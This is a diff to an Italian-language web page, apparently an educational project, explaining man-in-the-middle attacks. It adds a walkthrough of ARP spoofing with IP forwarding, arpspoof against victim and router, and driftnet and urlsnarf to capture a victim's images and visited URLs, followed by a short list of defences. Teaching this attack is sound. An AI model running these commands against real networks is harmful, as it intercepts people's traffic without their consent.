@@ -49,18 +49,37 @@
                     <img src="assets/img/mitm.png" alt=""class="immagine-ridimensionata">
                     <div class="subheading mb-5">
                     </div>
-                    <p>--------------------------------------------------------------------------------------------------------------------------------------
+                   <hr>
                     </p>
                     <H3>in cosa consiste...</H3>
-                    <p>--------------------------------------------------------------------------------------------------------------------------------------
+                   <hr>
                     </p>
                     <p class="lead mb-5"> un attacco man-in-the-midle (MITM) avviene quando un hacker maligno si mette in mezzo alla comunicazione tra dispositivi quali possono essere server e un host della rete. l'hacker manipola  la comunicazione intercettare dati oppure modificarli senza che le due parti se ne accorgono </p>      
                 </p><p class="lead mb-5">Per garantire una protezione adeguata, è fondamentale adottare protocolli crittografici come SSL/TLS e metodi di autenticazione affidabili</p>
-                    <p>--------------------------------------------------------------------------------------------------------------------------------------
+                   <hr>
                     </p>
                     <H3>cosa si è fatto</H3>
-                    <p>--------------------------------------------------------------------------------------------------------------------------------------
-                    <p class="lead mb-5"> </p>
+                   <hr>
+                    <p class="lead mb-5"> si sono utilizzati diversi comandi da terminale :</p>
+                    <p>$ sysctl -w net.ipv4.ip_forward=1</p>
+                    <p>che serve per serve per inoltrare tutti i pacchetti di rete IPv4, in questo modo il pc fungerà da Router</p>
+                    <p>$ arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]</p>
+                    <p> questo serve a indicare alla macchina vitima che noi siamo il router ossia il default gateway</p>
+                    <p> $ arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]</p>
+                    <p> con questo comando serve a dire al router che noi siamo la macchina vittima </p>
+                    <p> per sniffare le immagini della macchina vittima si procede con l'utilzare ils eguente comando</p>
+                    <p>$ driftnet -i [Network Interface Name]</p>
+                    <p> per sniffare sugli URL di navigazione della macchina vittima si utilizza il seguente comando</p>
+                    <p>$ urlsnarf -i [Network Interface Name]</p>
+                   <hr>
+                    <H3>metodi di difesa</H3>
+                    <hr>
+                    <ul>
+                        <li>Utilizzare protocolli crittografici come SSL/TLS</li>
+                        <li>Utilizzare connessioni VPN in modo da creare un tunnel crittografato tra il dispositivo dell'utente e il server di destinazione</li>
+                        <li></li>
+                        <li>Utilizzare metodi di autenticazione a più fattori</li>
+                    </ul>
                 </div>
 
         </div>
